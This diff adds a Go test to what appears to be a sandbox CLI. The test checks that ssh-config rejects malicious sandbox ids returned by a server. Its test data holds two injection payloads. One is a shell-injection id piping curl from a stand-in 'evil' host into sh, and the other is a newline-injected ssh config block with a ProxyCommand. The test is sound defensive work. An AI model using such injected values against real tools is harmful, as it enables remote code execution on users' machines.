@@ -809,3 +809,31 @@ func TestClean(t *testing.T) {
 		t.Errorf("bounded: %q", got)
 	}
 }
+
+// A server that lists ids no sandbox could have never gets them into ssh
+// config, where a ProxyCommand would run them on the operator's machine.
+func TestSSHConfigRefusesListedBadIDs(t *testing.T) {
+	r := newRig(t)
+	pub := string(ssh.MarshalAuthorizedKey(r.hostKey.PublicKey()))
+	pub = strings.TrimSpace(pub)
+	for _, bad := range []string{"x;curl${IFS}evil|sh", "sbx_0000000000000000\nHost *\n  ProxyCommand sh"} {
+		r.setWrap(func(w http.ResponseWriter, req *http.Request, next http.Handler) bool {
+			w.Header().Set("Content-Type", "application/json")
+			if req.Method == http.MethodGet && req.URL.Path == "/v1/sandboxes" {
+				_ = json.NewEncoder(w).Encode(map[string]any{"items": []map[string]any{{"id": bad}}})
+				return true
+			}
+			if strings.HasSuffix(req.URL.Path, ":ssh") {
+				alias := "abhed-" + bad
+				_ = json.NewEncoder(w).Encode(map[string]any{"host_alias": alias, "user": "sandbox", "host_key": pub,
+					"known_hosts": alias + " " + pub, "fingerprint": "f"})
+				return true
+			}
+			return false
+		})
+		res := r.run(t, "ssh-config")
+		if res.code == 0 || strings.Contains(res.out, "curl") || strings.Contains(res.out, "Host") {
+			t.Fatalf("ssh-config with %q: %+v", bad, res)
+		}
+	}
+}
